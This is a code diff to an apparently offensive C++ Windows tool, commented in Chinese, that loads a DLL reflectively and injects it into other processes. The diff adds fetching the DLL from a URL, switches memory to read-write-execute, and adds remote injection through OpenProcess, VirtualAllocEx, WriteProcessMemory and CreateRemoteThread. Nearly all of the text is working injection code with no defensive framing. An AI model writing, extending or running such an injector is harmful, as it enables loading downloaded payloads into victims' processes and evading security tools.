@@ -10,6 +10,7 @@
 #include <filesystem>
 
 #include "pe_parser.h"
+#include "args.h"
 
 #define _in_ 
 #define _out_
@@ -204,22 +205,39 @@ int ret_pid_by_proc_name(wchar_t* proc_name)
 
 int main(int ac, char* av[], char* env[])
 {
-    int local = 1;
+    args_parser args(ac, av);
+    std::vector<char> dll_bytes;
+
+    // 目标进程PID
+    int target_pid = 0;
 
 	// 搜索进程
-    if (local == 0)
+    if (args.is_local == 0)
     {
-		wchar_t* proc_name = get_wc(av[2]);
-		int pid = ret_pid_by_proc_name(proc_name);
+		wchar_t* proc_name = get_wc(args.process);
+		target_pid = ret_pid_by_proc_name(proc_name);
 		delete[] proc_name;
-		if (pid == 0)
+		if (target_pid == 0)
 			return -1;
     }
 
 	// 下载DLL
-    std::vector dll_bytes = load_local_file(av[1]);
-    if (dll_bytes.empty())
+    if (args.dll_src == dll_path_type::filename)
+    {
+		dll_bytes = load_local_file(args.filename);
+		if (dll_bytes.empty())
+			return -1;
+    }
+    else if (args.dll_src == dll_path_type::url)
+    {
+        dll_bytes = download_from_url(args.url);
+		if (dll_bytes.empty())
+			return -1;
+    }
+    else
+    {
         return -1;
+    }
 
     // 解析DLL
     pe_parser pe;
@@ -236,17 +254,14 @@ int main(int ac, char* av[], char* env[])
 	// WriteMemory
 	// CreateThread
 
-    if (local == 1)
+    if (args.is_local == 1)
     {
-        uintptr_t dll_ptr = (uintptr_t)VirtualAlloc(0, dll_bytes.size(), MEM_COMMIT, PAGE_READWRITE);
+        uintptr_t dll_ptr = (uintptr_t)VirtualAlloc(0, dll_bytes.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (dll_ptr == 0)
             return -1;
 
         memcpy((void*)dll_ptr, dll_bytes.data(), dll_bytes.size());
 
-        DWORD oldprotect = 0;
-        if (!VirtualProtect((VOID*)dll_ptr, dll_bytes.size(), PAGE_EXECUTE_READ, &oldprotect))
-            return -1;
 
         DWORD thread_id = 0;
         HANDLE thread = 0;
@@ -259,8 +274,38 @@ int main(int ac, char* av[], char* env[])
         char pause = getchar();
         return 0;
     }
+    else
+    {
+        HANDLE target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
+        if (target_process == 0)
+        {
+            return -1;
+        }
+        
+        void* target_memory = VirtualAllocEx(target_process, 0, dll_bytes.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (target_memory == 0)
+        {
+            return -1;
+        }
 
+        SIZE_T bytes_written = 0;
+        if (WriteProcessMemory(target_process, target_memory, dll_bytes.data(), dll_bytes.size(), &bytes_written) == FALSE)
+        {
+            return -1;
+        }
 
+        DWORD thread_id = 0;
+        HANDLE thread = 0;
+        thread = CreateRemoteThread(target_process, 0, 0, (LPTHREAD_START_ROUTINE)((uintptr_t)target_memory + func_raw), 0, CREATE_SUSPENDED, &thread_id);
+        if (thread == 0)
+        {
+            return -1;
+        }
+
+        ResumeThread(thread);
+
+        return 0;
+    }
 
 
 	return -1;
